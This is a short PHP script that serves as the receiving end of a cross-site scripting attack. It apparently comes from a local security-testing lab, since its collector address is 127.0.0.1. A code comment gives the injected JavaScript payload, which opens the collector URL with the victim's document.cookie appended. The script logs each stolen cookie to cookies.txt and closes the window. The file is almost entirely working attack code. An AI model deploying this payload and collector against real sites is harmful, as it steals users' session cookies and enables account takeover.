<?php

// use this line in order to hack - window.open("http://127.0.0.1/securitytesting/xssattack/xss.php?c="+document.cookie);

$cookie = $_GET["c"]; // GET all cookies stored in var "c"
{
	$fp = fopen("cookies.txt","a"); // Open file | create if it doesn't exist
	fputs($fp,$cookie . "\r\n"); // Write the content of the cookie
	fclose($fp); // close file
	echo "<script>window.close()</script>";
} ?>